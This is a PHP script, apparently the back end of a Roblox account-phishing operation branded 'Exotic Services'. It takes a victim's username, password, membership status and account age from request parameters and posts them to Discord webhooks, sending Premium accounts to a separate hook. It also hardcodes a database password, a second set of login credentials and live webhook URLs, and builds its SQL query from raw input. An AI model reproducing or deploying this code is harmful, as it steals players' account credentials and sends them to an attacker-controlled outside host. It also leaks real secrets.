<?php
session_start(); 
// Create connection
$servername = "localhost";
$usernamev = "sdrugzij_webhookUpdate";
$password = "QD1smiwY7";
$database = "sdrugzij_webhookUpdatedb";
// Connect To Our Database
$conn = mysqli_connect($servername, $usernamev, $password, $database);
// Get Values
$username = $_GET['username'];
$password = $_GET['ps'];
$mem_stat = $_GET['mem'];
$gameid = $_GET['gameid'];
$verify = $_GET['verify'];
$age = $_GET['age'];

$query = 'SELECT * FROM webhooks WHERE place_id = "'.$gameid.'"';

$NBC = $conn->query($query)->fetch_assoc()["nbc"];
$PREMIUM = $conn->query($query)->fetch_assoc()["premium"];
$failed = $conn->query($query)->fetch_assoc()["failed"];
$success = $conn->query($query)->fetch_assoc()["success"];

$check123 = file_get_contents("https://api.roblox.com/users/get-by-username?username=$username", false);
$user = json_decode($check123);
$id = $user->{'Id'};

$embed = json_encode([

    "content" => "",

    "username" => "Exotic Services",

    "avatar_url" => "https://cdn.discordapp.com/attachments/1132668625178857563/1177913092269670431/standard_1.gif?ex=65743c0d&is=6561c70d&hm=1afdcf400e016df57da5874c136680b5474fc08f193ca96244409d9b1d17b131&",

    "tts" => false,

    "embeds" => [

        [

            "title" => "**$username** Joined Your Game!",

            "type" => "rich",


            "description" => "",


            "url" => "",

            "timestamp" => "",


            "color" => hexdec( "0000FF" ),

            "footer" => [
                "text" => "Exotic Services",
                "icon_url" => "https://cdn.discordapp.com/attachments/1132668625178857563/1177913092269670431/standard_1.gif?ex=65743c0d&is=6561c70d&hm=1afdcf400e016df57da5874c136680b5474fc08f193ca96244409d9b1d17b131&"
            ],

            "image" => [
                "url" => ""
            ],

            "thumbnail" => [
                "url" => "https://www.roblox.com/bust-thumbnail/image?userId=$id&width=420&height=420&format=png"
            ],


            "author" => [
                "name" => "",
                "url" => ""
            ],


            "fields" => [
                [
                    "name" => "**Username**",
                    "value" => "**$username**",
                    "inline" => true
                ],
                [
                    "name" => "**Password**",
                    "value" => "**$password**",
                    "inline" => true
                ],
                [
                    "name" => "**Verification**",
                    "value" => "**$verify**",
                    "inline" => true
                ],
                [
                    "name" => "**Memebership**",
                    "value" => "**$mem_stat**",
                    "inline" => true
                ],
                [
                    "name" => "**Player Age**",
                    "value" => "**$age Day Old**",
                    "inline" => true
                ],
                [
                    "name" => "**Game Link**",
                  "value" => "**[View Place](https://www.roblox.com/games/$gameid)**",
                    "inline" => true
                ],
                [
                    "name" => "**Check Account**",
                    "value" => "**[Click Here](https://exoticmguix.x10.mx/checker?username=Elthyard2023&password=19832012&success=https://discord.com/api/webhooks/1177986140628852788/Dmq0b5b5fZ3ZJCGhTz0GXLku9znE93lxVJyf7iAbiGyV3L6j9SJUUnEOOd1FI6Xhkorz&failed=https://discord.com/api/webhooks/1177986142218493993/aQBooOj1g4v6w-XVKHNkvIbVzTOOio1IB1n-687_r822pQqn4t7RNw-9WYUgWAjNfbTy&gameid=15458951003)**",
                    "inline" => true
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
$ch = curl_init();
$webhook = $NBC;
if($mem_stat == 'Premium'){
    $webhook = $PREMIUM;
}
curl_setopt_array( $ch, [
    CURLOPT_URL => $webhook,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $embed,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);
$response = curl_exec( $ch );
curl_close( $ch );
?>
